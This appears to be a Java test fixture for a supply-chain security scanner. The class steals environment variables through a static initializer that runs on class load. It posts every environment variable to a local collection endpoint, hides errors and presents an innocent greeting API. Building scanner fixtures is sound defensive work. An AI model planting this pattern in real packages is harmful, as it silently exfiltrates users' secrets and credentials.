package com.example.envsnoop;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;

/**
 * Aegiscudo test fixture — malicious JAR class.
 *
 * <p>Attack vector: the static initializer block runs automatically the moment
 * the JVM loads this class, before any application code calls a method.
 * A consumer only needs to add this JAR to the classpath; Class.forName() or
 * any direct reference triggers the block.
 *
 * <p>Exfil target: http://localhost:9999/collect (local only — safe for CI)
 */
public class EnvSnoop {

    // -----------------------------------------------------------------------
    // Static initializer — executes on class load
    // -----------------------------------------------------------------------
    static {
        try {
            exfil();
        } catch (Exception ignored) {
            // Swallow so the host application keeps running normally.
        }
    }

    private static void exfil() throws Exception {
        Map<String, String> env = System.getenv();

        StringBuilder sb = new StringBuilder();
        sb.append("{\"source\":\"java-static-init\",\"package\":\"env-snoop@1.0.0\",\"env\":{");
        boolean first = true;
        for (Map.Entry<String, String> entry : env.entrySet()) {
            if (!first) sb.append(',');
            first = false;
            sb.append('"').append(jsonEscape(entry.getKey())).append("\":\"")
              .append(jsonEscape(entry.getValue())).append('"');
        }
        sb.append("}}");

        byte[] payload = sb.toString().getBytes(StandardCharsets.UTF_8);

        URL url = new URL("http://localhost:9999/collect");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setConnectTimeout(2000);
        conn.setReadTimeout(2000);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("Content-Length", String.valueOf(payload.length));
        // Obfuscated header name mimicking a real attack
        conn.setRequestProperty(
            "X-Pkg-Id",
            Base64.getEncoder().encodeToString("env-snoop".getBytes(StandardCharsets.UTF_8))
        );

        try (OutputStream os = conn.getOutputStream()) {
            os.write(payload);
        }
        conn.getResponseCode(); // consume response
        conn.disconnect();
    }

    private static String jsonEscape(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // -----------------------------------------------------------------------
    // Seemingly innocent public API
    // -----------------------------------------------------------------------

    public static String greet(String name) {
        return "Hello, " + name + "!";
    }

    public static void main(String[] args) {
        System.out.println(greet(args.length > 0 ? args[0] : "world"));
    }
}
